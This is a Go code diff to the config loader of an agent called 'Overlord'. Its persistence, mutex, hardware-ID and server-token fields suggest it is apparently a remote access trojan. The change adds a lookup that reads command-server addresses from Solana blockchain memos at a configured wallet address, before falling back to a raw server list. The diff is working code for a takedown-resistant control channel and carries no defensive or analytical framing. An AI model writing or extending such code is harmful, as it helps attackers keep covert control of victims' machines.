@@ -22,6 +22,9 @@ var AgentVersion = "1.6.8"
 var DefaultPersistence = "false"
 var DefaultServerURL = "wss://127.0.0.1:5173"
 var DefaultServerURLIsRaw = "false"
+var DefaultServerURLIsSol = "false"
+var DefaultSolAddress = ""
+var DefaultSolRPCEndpoints = ""
 var DefaultMutex = ""
 var DefaultID = ""
 var DefaultCountry = ""
@@ -48,6 +51,9 @@ type Config struct {
 	ServerURLs            []string
 	ServerIndex           int
 	RawServerListURL      string
+	SolEnabled            bool
+	SolAddress            string
+	SolRPCEndpoints       []string
 	Mutex                 string
 	ID                    string
 	HWID                  string
@@ -80,9 +86,44 @@ func Load() Config {
 	}
 	rawServerEnabled := isTruthy(rawServerFlag)
 
+	solFlag := strings.TrimSpace(os.Getenv("OVERLORD_SERVER_SOL"))
+	if solFlag == "" {
+		solFlag = DefaultServerURLIsSol
+	}
+	solEnabled := isTruthy(solFlag)
+
+	solAddress := strings.TrimSpace(os.Getenv("OVERLORD_SOL_ADDRESS"))
+	if solAddress == "" {
+		solAddress = strings.TrimSpace(DefaultSolAddress)
+	}
+
+	solRPCEndpointsStr := strings.TrimSpace(os.Getenv("OVERLORD_SOL_RPC_ENDPOINTS"))
+	if solRPCEndpointsStr == "" {
+		solRPCEndpointsStr = strings.TrimSpace(DefaultSolRPCEndpoints)
+	}
+	var solRPCEndpoints []string
+	if solRPCEndpointsStr != "" {
+		for _, ep := range strings.Split(solRPCEndpointsStr, ",") {
+			ep = strings.TrimSpace(ep)
+			if ep != "" {
+				solRPCEndpoints = append(solRPCEndpoints, ep)
+			}
+		}
+	}
+
 	serverURLs := []string{}
 	rawServerListURL := ""
-	if rawServerEnabled {
+	if solEnabled && solAddress != "" && len(solRPCEndpoints) > 0 {
+		agentToken := strings.TrimSpace(os.Getenv("OVERLORD_AGENT_TOKEN"))
+		if agentToken == "" {
+			agentToken = strings.TrimSpace(DefaultAgentToken)
+		}
+		if urls, err := LoadServerURLsFromSolana(solAddress, agentToken, solRPCEndpoints); err != nil {
+			log.Printf("[config] WARNING: failed to load server URL from Solana memo: %v", err)
+		} else {
+			serverURLs = urls
+		}
+	} else if rawServerEnabled {
 		rawServerListURL = server
 		if rawServerListURL != "" {
 			if urls, err := LoadServerURLsFromRaw(rawServerListURL); err != nil {
@@ -152,6 +193,9 @@ func Load() Config {
 		ServerURLs:            serverURLs,
 		ServerIndex:           serverIndex,
 		RawServerListURL:      rawServerListURL,
+		SolEnabled:            solEnabled,
+		SolAddress:            solAddress,
+		SolRPCEndpoints:       solRPCEndpoints,
 		Mutex:                 strings.TrimSpace(mutex),
 		ID:                    defaultHWID,
 		HWID:                  firstNonEmpty(fileSettings.HWID, defaultHWID),
